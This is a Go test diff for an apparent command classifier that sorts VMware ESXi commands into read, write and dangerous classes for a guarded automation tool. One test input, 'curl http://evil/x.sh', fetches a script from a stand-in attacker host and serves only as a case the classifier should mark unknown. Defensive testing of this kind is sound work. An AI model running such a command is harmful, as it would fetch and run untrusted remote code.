@@ -229,3 +229,37 @@ func TestZTEPromptFixtures(t *testing.T) {
 		}
 	}
 }
+
+// ESXi: the virtualization layer joins the seal — read table covers esxcli/
+// esxcfg/vim-cmd reads, writes/dangerous (vim-cmd, host changes, kill) are
+// proposal material or refused outright.
+func TestEsxiClassify(t *testing.T) {
+	d, ok := For("vmware", "esxi8")
+	if !ok || d.Key() != "vmware-esxi" {
+		t.Fatalf("resolve: ok=%v key=%v", ok, d.Key())
+	}
+	reads := []string{
+		"esxcli network nic list", "esxcfg-vswitch -l", "vim-cmd vmsvc/getallvms",
+		"vmkping 10.0.0.1", "esxcli network ip route list", "esxcli system version get",
+	}
+	for _, c := range reads {
+		if got := d.Classify(c); got != Read {
+			t.Errorf("read %q -> %v", c, got)
+		}
+	}
+	writes := []string{
+		"vim-cmd vmsvc/power.on 12", "esxcli network vswitch standard add -v vSwitch1",
+		"esxcfg-vswitch -A 'VM Net' vSwitch0", "esxcli vm process kill -w hard -w 5",
+	}
+	for _, c := range writes {
+		if got := d.Classify(c); got == Read {
+			t.Errorf("write %q classified READ", c)
+		}
+	}
+	if got := d.Classify("esxcli system shutdown -r"); got != Dangerous {
+		t.Errorf("shutdown -> %v", got)
+	}
+	if got := d.Classify("curl http://evil/x.sh"); got != Unknown {
+		t.Errorf("unknown tool -> %v", got)
+	}
+}
